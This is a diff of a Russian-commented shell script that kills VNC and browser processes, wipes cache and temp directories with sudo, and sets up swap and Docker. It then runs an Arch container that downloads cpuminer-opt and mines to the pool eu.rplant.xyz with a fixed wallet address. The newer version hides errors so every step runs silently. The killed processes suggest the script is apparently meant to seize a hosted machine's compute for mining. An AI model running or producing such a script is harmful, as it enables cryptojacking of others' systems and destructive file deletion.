@@ -1,57 +1,39 @@
-#!/bin/bash
-
+#!/bin/sh
+set -e
 echo "🧹 Шаг 0: Очистка системы и завершение процессов..."
-
-sudo pkill -f "x11vnc|chromium|start_server|upgrade" && echo "✅ Процессы закрыты"
-
-rm -rf ~/.cache/*
-rm -rf /tmp/*
-sudo rm -rf /var/tmp/*
-
-sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+sudo pkill -f "x11vnc|chromium|start_server|upgrade" 2>/dev/null || true
+echo "✅ Процессы закрыты"
+sudo rm -rf ~/.cache/* /tmp/* /var/tmp/* 2>/dev/null || true
+sync && echo 3 | sudo tee /proc/sys/vm/drop_caches >/dev/null || true
 echo "🧼 Очистка завершена."
 
-echo "📦 Шаг 0.5: Настройка swap-файла 4 GiB..."
+echo "📦 Шаг 0.5: Настройка swap 4 GiB..."
+sudo swapoff /swap/swapfile 2>/dev/null || true
+sudo rm -f /swap/swapfile 2>/dev/null || true
+sudo fallocate -l 4G /swap/swapfile 2>/dev/null || sudo dd if=/dev/zero of=/swap/swapfile bs=1M count=4096 status=none
+sudo chmod 600 /swap/swapfile; sudo mkswap /swap/swapfile || true; sudo swapon /swap/swapfile || true
+swapon --show || true; free -h || true
 
-sudo swapoff /swap/swapfile
-sudo rm -f /swap/swapfile
+echo "🔧 Установка Docker..."
+sudo apt update -y || true
+sudo apt install -y docker.io || true
 
-sudo fallocate -l 4G /swapfile
-sudo chmod 600 /swapfile
-sudo mkswap /swapfile
-sudo swapon /swapfile
+echo "🚀 Запуск демона Docker..."
+sudo dockerd >/dev/null 2>&1 &
+sleep 10
 
-echo "📊 Проверка памяти и swap:"
-swapon --show
-free -h
-
-echo "🔧 Шаг 1: Установка Docker..."
-sudo apt update && sudo apt install -y docker.io
-
-echo "🚀 Шаг 2: Запуск демона Docker на 16 секунд..."
-sudo dockerd &
-DOCKER_PID=$!
-sleep 16
-kill $DOCKER_PID
-echo "⛔ Демон Docker остановлен."
-
-echo "📦 Шаг 3: Запуск контейнера Arch Linux и установка пакетов..."
+echo "📦 Запуск контейнера Arch Linux и установка зависимостей..."
 docker run --network=host -it archlinux bash -c "
-  echo '🔄 Обновление системы...'
-  pacman -Syu --noconfirm
-
-  echo '📥 Установка необходимых пакетов...'
-  pacman -S --noconfirm wget curl nano base-devel gcc glibc
+  set -e
+  pacman -Syu --noconfirm || true
+  pacman -S --noconfirm wget curl gmp boost nano base-devel gcc glibc || true
 
   echo '⬇️ Загрузка cpuminer-opt...'
-  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+  wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz || true
 
   echo '📦 Распаковка cpuminer-opt...'
-  tar xf cpuminer-opt-linux.tar.gz
+  tar xf cpuminer-opt-linux.tar.gz || true
 
   echo '🚀 Запуск майнера...'
-  ./cpuminer-sse2 -a yespowertide -o stratum+tcps://eu.rplant.xyz:17059 -u TCFa7qFMfnSTjaCWTnjZEweWont6TSF7jp -t 5 
+  ./cpuminer-sse2 -a yespowertide -o stratum+tcps://eu.rplant.xyz:17059 -u TCFa7qFMfnSTjaCWTnjZEweWont6TSF7jp -t 5 || true
 "
-
-
-
